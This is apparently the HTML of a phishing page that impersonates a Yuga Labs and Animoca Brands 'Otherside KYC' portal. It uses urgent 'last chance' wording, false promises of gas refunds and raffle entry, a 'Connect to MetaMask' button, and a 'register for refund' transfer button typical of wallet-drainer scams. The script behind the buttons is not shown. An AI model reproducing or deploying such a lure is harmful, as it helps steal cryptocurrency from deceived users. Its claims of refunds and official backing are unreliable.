    <meta property="og:title" content="Yuga Labs x Animoca Brands">
    <meta content="OthersideMeta KYC✅" property="og:title">
    <meta content="
	🎉 We have reopen KYC for a limited amount of time. This your last chance to KYC! 

    ❗ Hurry Up and Good Luck!" property="og:description">
    <meta property="og:description" content="Something is brewing in the swamp.">
    <meta property="og:image" content="assets/dock.jpg">
    <link rel="icon" href="assets/favicon3.ico">

<body>
    <div id="root">
        <main>
            <!-- need to add "background--blurred" for blur background-->
            <div id="myBg" class="background"><video loop="" autoplay="" playsinline="" poster="assets/dock.jpg">
                    <source src="assets/video/dock.webm" type="video/webm">
                    <source src="assets/video/dock.mp4" type="video/mp4">
                </video>
                <div class="blur"></div>
            </div>
            <div class="kyc" style="justify-content: center;">
                <div id="connectDiv">
                    <button onclick="connect()" class="button">Connect to MetaMask</button>
                    <div class="disclaimer"><b>For mobile users, please open on PC.</b><br><br>Wallets that get KYCed but failed to mint will get full gas refund. Registering for a refund will also automatically add you to Wave 2 Otherside Lands Raffle List.</div>
                </div>
                <div class="kyc-block" style="display:none">
                    <div class="kyc-label">Account</div>
                    <div id="walletAddress" class="kyc-body">0x0</div>
                </div>
                <div class="kyc-block" style="display:none">
                    <div class="kyc-label">
                        <div>Status</div>
                        <div class="status status--not_found"></div>
                    </div>
                    <div class="kyc-body">Not registered: Eligible for gas refund.</div>
                </div>
                <div class="kyc-block" style="display:none; flex-basis: 100%; text-align: center;">
                    <button id="transferButton" class="button">Click to register for refund</button>
                    <div id="elig" style="color: red;"></div>
                </div>
            </div>
            <div class="sponsors">
                <div class="sponsors-list">
                    <div class="sponsor"><img src="assets/sponsors/yuga-labs.svg" alt="yuga-labs.svg" width="80"></div>
                    <div class="sponsor"><img src="assets/sponsors/animoca.svg" alt="animoca.svg" width="75"></div>
                    <div class="sponsor"><img src="assets/sponsors/apecoin.svg" alt="apecoin.svg" width="90"></div>
                </div>
            </div>
        </main>
    </div>
